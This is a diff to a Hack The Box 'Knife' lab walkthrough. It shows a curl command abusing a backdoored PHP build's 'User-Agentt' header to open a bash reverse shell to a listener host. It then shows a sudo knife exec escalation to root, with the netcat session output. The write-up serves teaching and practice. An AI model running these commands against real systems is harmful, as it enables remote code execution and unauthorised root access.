@@ -103,10 +103,10 @@ else:
 ```
 Another simple way, you can use this:
 
-curl http://10.10.10.242/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i
-&>/dev/tcp/10.10.14.25:1337 0>&1 '\");"
+Set up a python server, then run set a listener on port 1337, run this afterwards:
 
-Then set a listener on port 1337
+curl http://10.10.10.242/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i
+&>/dev/tcp/10.10.14.25/1337 0>&1 '\");"
 ```
 
 > RESULT
@@ -176,4 +176,45 @@ User james may run the following commands on knife:
 $ 
 ```
 
-6. 
+6. We can run a tool named knife as root, we can use this for privesc.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/75cbb401-833d-4af7-9666-a1f1ea903f24)
+
+
+7. But to get privesc, we need to do reverse shell first.
+
+> Example of we can't use knife.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/10a0cdc8-9572-43fc-9eb9-55e57162dc92)
+
+
+> Getting reverse shell
+
+![pentest-knnife](https://github.com/jon-brandy/hackthebox/assets/70703371/fdc1a609-bed9-40cd-8237-3cefd45d0479)
+
+
+> Privesc moment
+
+```
+Command:
+
+sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
+```
+
+> RESULT
+
+```
+┌──(brandy㉿bread-yolk)-[~]
+└─$ nc -nvlp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.25] from (UNKNOWN) [10.10.10.242] 50652
+bash: cannot set terminal process group (947): Inappropriate ioctl for device
+bash: no job control in this shell
+james@knife:/$ sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
+sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# 
+```
+
